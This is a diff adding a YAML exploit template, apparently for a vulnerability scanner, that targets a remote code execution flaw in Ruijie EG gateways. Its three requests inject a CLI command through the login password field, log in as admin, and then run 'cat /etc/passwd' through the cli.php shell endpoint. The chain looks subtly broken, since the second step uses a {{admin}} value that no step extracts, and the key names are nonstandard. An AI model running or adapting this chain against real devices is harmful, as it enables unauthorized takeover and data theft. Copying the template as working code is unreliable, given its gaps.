@@ -1,0 +1,42 @@
+id: ruijie-eg-rce
+brief:
+    title: Ruijie EG - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: Ruikie EG's cli.php end point allows remote unauthenticated attackers to gain 'admin' privileges. The vulnerability is exploitable because an unauthenticated user can gain 'admin' privileges due to...
+    label:
+        - ruijie
+        - rce
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=admin&password=admin?show+webmaster+user
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=admin&password={{admin}}
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cli.php?a=shell'
+      head:
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+      body: notdelay=true&command=cat /etc/passwd
+      signs:
+        - "on": status
+          status:
+            - 200
